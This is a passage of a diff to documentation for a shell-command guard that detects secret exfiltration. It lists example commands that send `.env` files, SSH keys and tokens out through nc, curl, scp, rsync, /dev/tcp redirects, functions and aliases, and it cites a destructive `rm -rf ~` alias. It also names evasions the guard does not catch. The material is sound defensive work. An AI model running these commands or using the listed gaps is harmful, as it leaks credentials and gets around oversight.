+  split into words with sftp's quotes and backslashes (`put ".env"`), read
+  from its input (a here-string, an ANSI-C one included, a here-document,
+  what an `echo` before it prints without its options, or what a `printf`
+  prints with its format applied) and from a process substitution it reads
+  (`-b <(echo …)`, `< <(echo …)`), unless `-b` names a file other than its
+  input (`-`, `/dev/stdin`), which is not read. A `put -r` of the workspace
+  sends it.
 - **A copy to another machine**: `scp`, `rsync`, `sftp` and `rclone copy` to
-  a `host:path` (or `rsync://`, `::module`) destination, and `aws s3`
-  and `gsutil` to a `s3://` or `gs://` one. A source that is a secret goes.
-  So does the home directory itself, and a folder that holds it, the root of
-  the disk included, which hold them (`scp -r ~ host:`, `scp -r / host:`). A
-  destination only known when it runs counts as remote for `scp` and `sftp`,
-  and for the others when it holds a colon. The key a program logs in with
-  (`ssh -i`, `scp -i`, `-o IdentityFile=`, `curl --key`) is not sent.
+  a `host:path` (or `rsync://`, `::module`) destination, and `aws s3`,
+  `gsutil` and `gcloud storage` (`cp`, `mv`, `rsync`) to a `s3://` or `gs://`
+  one. On POSIX there are no drives, so a one-letter host is a host:
+  `scp .env h:` and `rsync -av .env h:/backup` send. A source that is a secret
+  goes. So does the home directory itself, and a folder that holds it, the
+  root of the disk included, which hold them (`scp -r ~ host:`, `scp -r /
+  host:`). A copy of a whole folder (`scp -r`, `rsync -r` or `-a`, `rclone`,
+  `aws s3 sync` or `--recursive`, `gsutil` and `gcloud storage` with `-r` or
+  `rsync`) of the workspace or a folder that holds it sends the workspace,
+  which may hold an `.env` file: `rsync -av . host:/backup` and `scp -r .
+  host:` say so in the reason, unless the `--exclude` patterns together leave
+  out every name that holds secrets: `.env`, `.env.local`, `.envrc` and
+  `prod.env` (`--exclude '.env*' --exclude '*.env'`). `--exclude .env` alone
+  still sends `.env.local` and `.envrc`. So does an archive of the workspace
+  sent on (`tar czf - . | ssh host …`, `tar czf x.tgz . && scp x.tgz host:`),
+  and a copy of it sent on (`cp -r . /tmp/w && scp -r /tmp/w host:`). A destination only known when it
+  runs counts as remote for `scp` and `sftp`, and for the others when it holds
+  a colon. The key a program logs in with (`ssh -i`, `scp -i`, `-o
+  IdentityFile=`, `curl --key`) is not sent.
 - **A pipeline.** A stage reads a secret (any program given one's path, the
   environment, or a file redirected onto it) and a later stage sends its input:
-  `nc`, `ncat`, `socat`, `telnet`, `ssh`, `mail`, `Invoke-RestMethod`,
+  `nc` (`nc.openbsd`, `nc.traditional`), `ncat`, `socat`, `telnet`, `ssh`,
+  `mail`, `s-nail`, `gh gist create`, `Invoke-RestMethod`,
   `Send-MailMessage` (which attaches what it is piped), `curl`
   with `-d @-` or `-T -`, `wget --post-file=-`, `http` and `xh` (unless
   `--ignore-stdin`), `openssl s_client`, `rclone rcat`, `aws s3 cp -`. A stage between them changes nothing: `cat .env | base64 | nc h
@@ -2385,7 +2745,12 @@ file that is not one is safe (`scp build/pkg.tar host:/srv/`,
   .env | curl -H "X: $(date)" url` is flagged too, since it pipes a secret into
   a sender.
 - **A redirect.** A secret redirected onto the input of one of those
-  (`nc host 1 < ~/.ssh/id`, in cmd `ssh host < .env`), or a command's output
+  (`nc host 1 < ~/.ssh/id`, in cmd `ssh host < .env`), onto the shell's own
+  input for the rest of the line (`exec < .env; nc host 1`, `exec 0< .env`:
+  the grammar reads the `0` written against `<` as a word, and the walk
+  gives it back to the redirect), or the file
+  `xargs -a` (`--arg-file`) reads its arguments from (`xargs -a .env curl -d`);
+  or a command's output
   redirected to `/dev/tcp/host/port` or `/dev/udp/…`. Only bash's own redirect
   opens that path: `tee /dev/tcp/…` and `dd of=/dev/tcp/…` open a real path,
   find none and send nothing. PowerShell has no `<` redirect.
@@ -2396,17 +2761,50 @@ file that is not one is safe (`scp build/pkg.tar host:/srv/`,
   K=$(…)`, and a variable set from that, copies included: `j=$k`, `j="$k"`,
   `export j=$k`). A held variable carried by a here-string or an unquoted
   here-document is a sender's input (`nc host 1 <<< "$k"`); a quoted
-  delimiter (`<<'EOF'`) expands nothing.
+  delimiter (`<<'EOF'`) expands nothing. A variable a builtin sets from a
+  secret holds it too: a `for` over a substitution (`for k in $(cat .env)`),
+  `read` (its names, `-a`'s array, or `REPLY`) and `mapfile` and `readarray`
+  (their array, or `MAPFILE`) from what they read or are piped (`read k <
+  .env`, `cat .env | while read l; do …; done`), and `printf -v k` from what
+  it is handed. A `source` (`.`) of a secret file sets variables the line
+  does not show, so any variable a later command reads may hold it: `source
+  .env && curl -H "X: $TOKEN" …`, and a here-string or here-document that
+  expands one after it (`source .env; nc host 1 <<< "$TOKEN"`). So does
+  `export`, `declare`, `typeset`, `local` or `readonly` given a substitution
+  that reads a secret as its words (`export $(cat .env | xargs)`), which sets
+  whatever names it prints; `export k=$(cat .env)` sets `k` alone.
 
 A script a shell starts, a `find -exec` and a substitution take the place in a
-pipeline of the command they run for.
+pipeline of the command they run for. A function or an alias the line
+defines is followed at every call of it. Each body is read once for the first
+secret it reads and whether it can send anything (a sender, or a redirect to
+a network connection in it), and a body that calls another takes on what that
+one does, through calls between bodies to any depth, each body settled once
+(a body calling itself ends there). A call then reads its body's secret in
+its own place on the line (`f() { cat .env; }; f | nc host 1`, `curl -d
+"$(f)"`, `k=$(f)`, `nc host 1 < <(f)`), and a call of a body that sends sends
+what the call is given: a secret named in its words, which the body reads as
+`$1` (`f() { curl -T "$1" …; }; f .env`), a substitution or a variable that
+holds one, what it is piped (`f() { nc host 1; }; cat .env | f`) and what is
+redirected onto it (`f < .env`). A body that sends anything counts, so `f() {
+curl https://x; }; cat .env | f` is flagged too. An alias's value is read as
+a script where it is defined, as a function's body is, so every rule judges
+what it runs (`alias python3='rm -rf ~'` is a `delete`): each `NAME=VALUE`
+of one `alias` (after a `--`) is a body of its own. A call of an alias with
+words of its own is judged as the shell runs it, the last command of the
+value with the call's words after its own: `alias c='curl -T'; c .env
+https://x` is `curl -T .env https://x`. Each name keeps its last four bodies;
+past four, its two oldest are kept as one range of units, from the start of
+the first to the end of the second, which also holds whatever the line runs
+between them, so a call of the name may be judged with more than it runs and
+flagged for it.
 
 Not read, so the caller has to account for them: a secret read into a PowerShell
-variable (`$k = Get-Content …`) or by `read` and `mapfile`; a path known only
-when it runs (`curl -d @$F`); a connection opened with `exec 3<>/dev/tcp/…`;
-`git push` of a committed `.env`; secrets outside core's table (`/etc/shadow`,
-a key with an unusual name); and a `find -exec` whose filter picks secrets by a
-name the guard does not know (`-name '*.pem'`).
+variable (`$k = Get-Content …`); a path known only when it runs (`curl -d
+@$F`); a connection opened with `exec 3<>/dev/tcp/…`; an `sftp -b` batch file;
+`git push` of a committed `.env`; secrets outside core's table and the names
+above (`/etc/shadow`, a key with an unusual name); and a `find -exec` whose
+filter picks secrets by a name the guard does not know (`-name '*.pem'`).
 
 ## Data in a database
 
@@ -2493,10 +2891,12 @@ first are taken off. The plain text between a body's expansions is scanned
 like the rest of it, so a backtick after a `$USER` or `$(pwd)` is code and an
 escaped one (`` \`x\` ``), before or after an expansion, runs nothing and reads
 as before. What cannot be read is `Unreadable`: a backtick
-that never closes, code that does not parse, a backtick inside a `${…}` (or
-another part the grammar read for itself), and an unquoted here-document in a
-backtick substitution that holds an escaped backtick, where the outer
-substitution takes a backslash off first and the body is not what it shows.
+that never closes, code that does not parse, and a backtick inside a `${…}`
+(or another part the grammar read for itself). An unquoted here-document in a
+backtick substitution that holds an escaped backtick is read once the outer
+substitution has taken its backslashes off, as every escaped backtick inside
+backticks is (see [Values read again as code](#values-read-again-as-code)),
+so the body is what the shell reads.
 
 The body of an unquoted delimiter is joined the same way when the guard splits
 the line, also one inside `"$(…)"` or a backtick in double quotes: a
